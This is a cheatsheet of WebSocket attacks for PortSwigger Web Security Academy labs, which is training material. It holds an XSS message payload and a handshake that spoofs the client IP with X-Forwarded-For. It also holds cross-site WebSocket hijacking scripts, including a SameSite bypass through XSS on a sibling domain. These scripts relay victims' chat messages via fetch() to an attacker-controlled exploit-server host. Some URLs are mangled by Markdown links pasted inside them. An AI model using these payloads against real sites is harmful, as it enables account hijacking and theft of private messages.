# 🔌 WebSockets Vulnerabilities Cheatsheet

Complete exploitation methodologies, handshake header bypasses, Cross-Site WebSocket Hijacking (CSWH), and payload templates for WebSocket labs in PortSwigger Web Security Academy.

---

## 📌 Core Mechanisms & Concepts

* **WebSocket Handshake:** Initiated via HTTP `GET` request with `Upgrade: websocket` and `Connection: Upgrade` headers.
* **Security Model:** WebSockets do not adhere to Same-Origin Policy (SOP) by default. Cross-origin WebSocket connections rely entirely on the server checking the `Origin` header or applying session tokens/cookies correctly.

---

## 🛠️ Detailed Breakdown & Payloads

### 1. Message & Handshake Manipulations

**Manipulating WebSocket messages to exploit vulnerabilities**
The application renders WebSocket message content directly into the client DOM without escaping, leading to XSS:

```json
{"message":"<img src=x onerror=alert(1)>"}
```

**Manipulating the WebSocket handshake to exploit vulnerabilities**
The target server blocks or rate-limits IP addresses upon detecting malicious WebSocket payloads. Bypass IP restrictions by injecting client IP headers during the HTTP upgrade handshake:

```http
GET /chat HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Upgrade: websocket
Connection: Upgrade
X-Forwarded-For: 1.2.3.4
Sec-WebSocket-Version: 13
```

---

### 2. Cross-Site & SameSite Bypasses

**Cross-site WebSocket hijacking (CSWH)**
The WebSocket handshake relies solely on session cookies for authentication and fails to validate the `Origin` header. An attacker hosts a malicious script that opens a cross-origin WebSocket connection to exfiltrate real-time messages:

```html
<script>
    var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('[https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key=](https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key=)' + encodeURIComponent(event.data));
    };
</script>
```

**SameSite Strict bypass via sibling domain**
Cookies are set with `SameSite=Strict`, preventing direct cross-site WebSocket initiation. An attacker leverages an XSS vulnerability on a trusted sibling domain (sharing the same site context) to forge the WebSocket connection:

```html
<script>
    location = "[https://YOUR-SIBLING-DOMAIN.web-security-academy.net/?xss=](https://YOUR-SIBLING-DOMAIN.web-security-academy.net/?xss=)<script>var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat'); ws.onopen = function(){ ws.send('READY'); }; ws.onmessage = function(event){ fetch('[https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key=](https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key=)' %2b encodeURIComponent(event.data)); };%3c/script>";
</script>
```
